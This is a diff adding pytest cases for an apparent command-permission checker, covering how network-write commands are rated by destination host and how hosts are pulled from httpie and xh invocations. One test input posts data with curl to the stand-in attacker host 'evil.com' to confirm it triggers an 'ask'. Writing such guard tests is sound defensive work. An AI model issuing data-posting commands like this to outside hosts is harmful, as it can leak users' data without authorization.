@@ -138,3 +138,49 @@ class TestExtractHost:
 
     def test_curl_with_flags(self):
         assert extract_host(["curl", "-s", "-o", "/dev/null", "https://api.github.com"]) == "api.github.com"
+
+
+# --- FD-022: Network write context ---
+
+
+class TestNetworkWriteContext:
+    """FD-022: network_write context resolution."""
+
+    def test_localhost_allow(self):
+        decision, _ = resolve_network_context(
+            ["curl", "-d", "{}", "http://localhost:3000"], "network_write"
+        )
+        assert decision == "allow"
+
+    def test_known_host_ask(self):
+        decision, _ = resolve_network_context(
+            ["curl", "-X", "POST", "https://github.com"], "network_write"
+        )
+        assert decision == "ask"
+
+    def test_unknown_host_ask(self):
+        decision, _ = resolve_network_context(
+            ["curl", "-d", "x", "https://evil.com"], "network_write"
+        )
+        assert decision == "ask"
+
+    def test_backward_compat_default_param(self):
+        """Default action_type preserves old behavior: known hosts → allow."""
+        decision, _ = resolve_network_context(["curl", "https://github.com"])
+        assert decision == "allow"
+
+
+# --- FD-022: httpie host extraction ---
+
+
+class TestExtractHostHttpie:
+    """FD-022: httpie host extraction."""
+
+    def test_http_bare_host(self):
+        assert extract_host(["http", "example.com"]) == "example.com"
+
+    def test_http_method_host(self):
+        assert extract_host(["http", "POST", "example.com"]) == "example.com"
+
+    def test_xh_url(self):
+        assert extract_host(["xh", "POST", "https://api.example.com/path"]) == "api.example.com"
